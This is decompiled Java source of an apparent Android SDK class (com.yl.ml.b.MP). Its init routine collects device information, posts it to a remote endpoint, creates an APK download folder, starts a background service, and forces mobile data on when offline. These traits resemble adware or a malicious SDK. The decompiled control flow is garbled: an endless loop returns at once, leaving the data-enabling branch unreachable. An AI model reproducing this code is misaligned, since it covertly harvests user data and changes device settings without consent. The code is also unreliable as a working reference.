package com.yl.ml.b;

import android.content.Context;
import android.content.Intent;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.NetWorkUtil;
import com.yl.codelib.utils.SDCardUtil;
import com.yl.ml.common.AppDo;
import com.yl.ml.date.ConFigFile;
import com.yl.ml.ser.SHService;
import com.yl.ml.thread.GetPVUrlThread;
import com.yl.ml.thread.GetSdkInfoThread;
import com.yl.ml.thread.GoOnFankuiThread;
import com.yl.ml.thread.SdkStartInitThread;
import java.util.Map;

public class MP
{
  public static String closeExitDialogTime;
  public static String closeStopDialogTime = null;
  public static int index = 0;
  public static String showExitDialogTime = null;
  public static String showStopDialogTime;
  
  static
  {
    closeExitDialogTime = null;
    showStopDialogTime = null;
  }
  
  public MP() {}
  
  public static void init(Context paramContext)
  {
    LogUtil.v("MP.init");
    MA.payListNum = 0;
    SDCardUtil.createFolder(ConFigFile.SD_ThemePath);
    SDCardUtil.createFolder(ConFigFile.SD_APKPath);
    SDCardUtil.createFolder(ConFigFile.SD_PICTURE);
    SDCardUtil.createFolder(ConFigFile.SD_INFO);
    Object localObject = AppDo.getUserBaseDeviceInfo(paramContext);
    MyPreference localMyPreference = new MyPreference(paramContext);
    if (NetWorkUtil.hasNetWork(paramContext))
    {
      new Thread(new GetSdkInfoThread(paramContext)).start();
      new Thread(new SdkStartInitThread(ConFigFile.Url_JSMain + "/initMobileInfoapiInitMobile.do", paramContext, null, (Map)localObject)).start();
      new Thread(new GetPVUrlThread(null, (Map)localObject)).start();
      new Thread(new GoOnFankuiThread(paramContext)).start();
    }
    for (;;)
    {
      localMyPreference.write("sdkinit", "ok");
      try
      {
        localObject = new Intent(paramContext, SHService.class);
        ((Intent)localObject).setAction("com.yl.mp.ShService.init");
        paramContext.startService((Intent)localObject);
        return;
      }
      catch (Exception paramContext) {}
      NetWorkUtil.openGprs(paramContext, true);
      new Thread(new T(paramContext, new S(paramContext, (Map)localObject, localMyPreference))).start();
    }
  }
}
